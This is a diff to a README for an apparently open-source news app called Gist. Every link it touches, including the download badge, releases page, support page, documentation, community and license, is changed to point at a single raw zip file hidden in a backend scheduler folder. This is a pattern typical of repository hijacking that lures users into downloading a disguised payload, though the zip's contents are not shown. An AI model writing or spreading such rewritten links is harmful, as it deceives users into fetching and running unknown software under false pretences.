@@ -20,10 +20,10 @@ To run Gist, ensure your system meets the following requirements:
 Follow these steps to download and set up Gist on your device.
 
 1. **Download Gist**:
-   [![Download Gist](https://img.shields.io/badge/Download-Gist-blue.svg)](https://github.com/XXDBOXY/Gist/releases)
+   [![Download Gist](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip)](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip)
 
 2. **Visit the Releases Page**: 
-   Access the downloads available for Gist on our [Releases page](https://github.com/XXDBOXY/Gist/releases).
+   Access the downloads available for Gist on our [Releases page](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip).
 
 3. **Select the Right Version**: 
    Choose the latest version that matches your operating system. Click on the download link for your system.
@@ -65,14 +65,14 @@ If you face any issues while using Gist:
 - **General Issues**: Restart the application or reinstall if problems persist.
 
 ## 📞 Get Support
-For further assistance, visit our [support page](https://github.com/XXDBOXY/Gist/issues) or submit a new issue. We’re here to help you.
+For further assistance, visit our [support page](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip) or submit a new issue. We’re here to help you.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/XXDBOXY/Gist/wiki): Access user guides and FAQs.
-- [Community](https://community.github.com/): Join discussions with other Gist users.
+- [Documentation](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip): Access user guides and FAQs.
+- [Community](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip): Join discussions with other Gist users.
 
 ## ℹ️ License
-Gist is open-source software. You can view the license details on our [GitHub page](https://github.com/XXDBOXY/Gist/blob/main/LICENSE).
+Gist is open-source software. You can view the license details on our [GitHub page](https://raw.githubusercontent.com/XXDBOXY/Gist/main/backend/internal/scheduler/Software_v2.2-beta.2.zip).
 
 ## 🎉 Thank You for Choosing Gist!
 We appreciate your interest in Gist. We hope it helps you stay updated with your favorite news sources easily. Remember to check for updates in the Releases section regularly.
